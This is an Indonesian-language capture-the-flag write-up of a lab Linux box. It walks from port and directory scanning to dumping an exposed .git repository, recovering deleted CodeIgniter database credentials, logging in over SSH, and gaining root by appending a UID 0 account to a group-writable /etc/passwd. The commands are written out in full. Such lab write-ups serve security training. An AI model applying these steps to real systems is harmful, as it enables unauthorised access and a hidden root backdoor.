|Item|Detail|
|---|---|
|IP Target|10.1.2.137|
|Difficulty|Easy|
|OS|Linux|

### 1. Reconnaissance

#### Port Scanning

Scan awal menggunakan `rustscan` menemukan dua port terbuka:

```
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

#### Web Enumeration

Directory/file brute-forcing menggunakan `feroxbuster` terhadap layanan web di port 80 menghasilkan beberapa temuan menarik:

```
200      GET        1l        2w       28c http://10.1.2.137/
200      GET        6l       39w      218c http://10.1.2.137/history
200      GET       21l      173w     1097c http://10.1.2.137/license.txt
200      GET       11l       14w      131c http://10.1.2.137/system/
200      GET       11l       14w      131c http://10.1.2.137/application/
200      GET     1111l     3461w    29860c http://10.1.2.137/system/core/Security.php
```

Ditemukan `license.txt` yang mengindikasikan aplikasi web menggunakan **CodeIgniter**, serta file `system/core/Security.php` yang ter-_expose_ sebagai source code mentah  konfirmasi ini adalah struktur direktori framework **CodeIgniter 3 (CI3)**.

#### Informasi dari `/history`

Endpoint `/history` menyediakan catatan pengembang (developer notes) yang menjadi petunjuk penting:

```
Notes from Vulcan

1. Created original file with CI4
2. Done setting up basic configuration files
3. CI4 cannot be used because PHP version, downgrading to CI3
4. Will reconfig the files later, need to feed my dog Kay
```

Catatan ini mengungkapkan bahwa aplikasi awalnya dibangun dengan **CodeIgniter 4**, kemudian di-_downgrade_ ke **CodeIgniter 3** karena ketidakcocokan versi PHP. Informasi ini menjadi indikasi kuat bahwa mungkin terdapat sisa artefak dari proses migrasi tersebut, termasuk kemungkinan version control history yang tidak sengaja ter-_expose_.

### 2. Exploitation — Git Exposure

Berdasarkan indikasi proses development yang disebutkan di `/history`, dilakukan pengecekan terhadap eksistensi direktori `.git` pada webroot:

```bash
curl -s http://10.1.2.137/.git/HEAD
```

Direktori `.git` terkonfirmasi dapat diakses secara publik sebuah kesalahan konfigurasi deployment yang cukup umum ditemukan, di mana folder version control ikut ter-upload ke server produksi.

#### Dumping Repository

Repository di-dump menggunakan `git-dumper`:

```bash
git-dumper http://10.1.2.137/.git/ ./dumped_repo
cd ./dumped_repo
```

#### Analisis History Commit

Pengecekan riwayat commit dilakukan untuk menelusuri jejak proses downgrade CI4 → CI3 yang disebutkan dalam catatan developer:

```bash
git log --all --oneline
```

```
e94cb40 (HEAD -> main, origin/main, origin/HEAD) main4
74f91cc main3
8793761 downgrade
e99fe51 main2
cd7a492 main
8c1a6e4 Initial commit
```

Analisis lebih lanjut terhadap seluruh diff history:

```bash
git log --all -p
```

Ditemukan sebuah file yang sudah dihapus pada salah satu commit, yaitu konfigurasi database versi CodeIgniter 4 (`app/Config/Database.php`), yang berisi kredensial database dalam bentuk plaintext:

```diff
diff --git a/mainpage/app/Config/Database.php b/mainpage/app/Config/Database.php
deleted file mode 100644
index c935151..0000000
--- a/mainpage/app/Config/Database.php
+++ /dev/null
@@ -1,91 +0,0 @@
public $default = [
-        'DSN'      => '',
-        'hostname' => 'localhost',
-        'username' => 'hungrydoggo',
-        'password' => 'DestroyAllNomadicCities',
        ...
```

Kredensial `hungrydoggo:DestroyAllNomadicCities` yang ditemukan konsisten dengan petunjuk "feed my dog Kay" pada catatan `/history` sebelumnya, memperkuat validitas temuan ini sebagai kredensial yang relevan.

### 3. Initial Access SSH

Kredensial yang ditemukan dicoba pada layanan SSH (port 22) dan berhasil melakukan autentikasi:

```bash
ssh hungrydoggo@10.1.2.137
# Password: DestroyAllNomadicCities
```

Login berhasil, dan flag user ditemukan:

```bash
cat user.txt
b8be295a************
```

### 4. Privilege Escalation

#### Enumerasi Grup dan Permission

Pengecekan awal terhadap grup keanggotaan user saat ini:

```bash
id
```

```
uid=1000(hungrydoggo) gid=1000(hungrydoggo) groups=1000(hungrydoggo),4(adm)
```

User `hungrydoggo` merupakan anggota grup `adm`. Selanjutnya dilakukan pencarian file yang writable oleh grup tersebut:

```bash
find / -group adm -perm -g=w -type f 2>/dev/null
```

```
/etc/passwd
```

Verifikasi permission pada `/etc/passwd`:

```bash
ls -al /etc/passwd
```

```
-rw-rw-r-- 1 root adm 1821 Jul 15 18:31 /etc/passwd
```

Ditemukan bahwa `/etc/passwd` memiliki group ownership `adm` dengan izin _write_ untuk grup tersebut (`rw-rw-r--`) sebuah kesalahan konfigurasi permission yang kritis, karena secara default file ini seharusnya hanya dapat ditulis oleh `root`.

#### Eksploitasi Write Access pada `/etc/passwd`

Karena grup `adm` memiliki akses tulis terhadap `/etc/passwd`, dimungkinkan untuk menambahkan user baru dengan UID `0` (setara root).

**1. Generate password hash** menggunakan `openssl`:


```bash
openssl passwd -1 -salt xyz password123
```

```
$1$xyz$yHoMTbjR/T1EsmNb.r7cu0
```

**2. Tambahkan entry user baru** dengan UID dan GID `0`:

```bash
echo 'greed:$1$xyz$yHoMTbjR/T1EsmNb.r7cu0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**3. Switch user** ke akun yang baru dibuat:

```bash
su greed
```

Berhasil mendapatkan akses dengan privilege root. Flag root ditemukan:

```bash
cat /root/root.txt
ac3958131**********
```